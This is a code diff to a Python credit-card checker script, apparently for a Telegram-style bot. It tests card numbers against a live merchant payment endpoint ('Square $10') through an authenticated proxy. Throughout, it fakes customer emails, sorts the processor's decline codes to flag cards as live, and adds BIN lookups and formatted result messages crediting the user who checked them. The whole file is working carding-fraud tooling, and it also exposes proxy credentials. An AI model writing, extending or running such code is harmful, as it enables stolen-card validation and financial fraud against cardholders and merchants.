@@ -1,4 +1,5 @@
 import requests, re, random, string, time
+from concurrent.futures import ThreadPoolExecutor
 
 #PROXY SET
 username = "5jyhut1y7txru6p"
@@ -11,13 +12,37 @@ proxies = { "http": "http://{}".format(proxy_auth) }
 def email():
 	return ''.join(random.choice(string.ascii_lowercase) for x in range(random.randint(7, 15))) + str(
 		random.randint(1111, 9999)) + '@gmail.com'
-		
+
+def get_bin_info(bin_value):
+    url = "https://api.voidex.dev/api/bin"
+    params = {"bin": bin_value}
+    response = requests.get(url, params=params)
+
+    data = {}
+    if response.status_code == 200:
+        data = response.json()
+    return data
+
+def get_bin_info_parallel(bin_values):
+    with ThreadPoolExecutor() as executor:
+        results = list(executor.map(get_bin_info, bin_values))
+        results = results[0]
+        if results:
+        	results = f"""
+BIN Info: {results.get('brand', '------')} - {results.get('level', '------')} - {results.get('type', '------')}
+Country: {results.get('country_name', '------')} {results.get('country_flag', '------')}
+Bank: {results.get('bank', '------')}
+BIN API: {results.get('bin_api', '------')}"""
+        	return results
+        else:return "Invalid BIN! ❌"
+
 # LISTA BREAK
 def pregs(lst):
 	arrays = re.findall(r'[0-9]+', lst)
 	return arrays
 
-def gate(cc_info):
+def gate(cc_info,sedner):
+	start_time = time.time()
 	arrs = pregs(cc_info)
 	cc = arrs[0]
 	exp_month = str(int(arrs[1]))
@@ -178,15 +203,26 @@ def gate(cc_info):
 		}
 		
 	response = requests.post('https://norva.club/assets/php/process-payment.php', cookies=cookies, headers=headers, json=json_data, proxies=proxies).text
-
-	msg = """"""
-
+	end_time = time.time()
+	execution_time = end_time - start_time
+	execution_time = f"{execution_time:.1f}"
 	if '{"errors":[{"category":"PAYMENT_METHOD_ERROR","code":"GENERIC_DECLINE","detail":"Authorization error: \'GENERIC_DECLINE\'"}]}' in response:
-		msg += (f"{cc_info} GENERIC_DECLINE")
+		res = ("GENERIC_DECLINE")
 	elif '{"errors":[{"category":"PAYMENT_METHOD_ERROR","code":"CVV_FAILURE","detail":"Authorization error: \'CVV_FAILURE\'"}]}' in response:
-		msg += (f"{cc_info} CVV_FAILURE ✅")
+		res = ("CVV_FAILURE ✅")
 	elif '{"errors":[{"category":"PAYMENT_METHOD_ERROR","code":"TRANSACTION_LIMIT","detail":"Authorization error: \'TRANSACTION_LIMIT\'"}]}' in response:
-		msg += (f"{cc_info} Not Sufficient Funds ✅")
+		res = ("Not Sufficient Funds ✅")
 	else:
-		msg += (f"{cc_info} {response}")
+		res = (f"{response}")
+	bin_info = get_bin_info_parallel([f"{cc_info[:6]}"])
+	msg = f"""
+Gate: Square $10
+BIN ⇾ {cc_info[:6]}
+
+`{cc_info}`
+Response: {res}
+{bin_info}
+Checked By {sedner}
+Time: {execution_time} seconds
+made by 《 OWNER 》"""
 	return msg
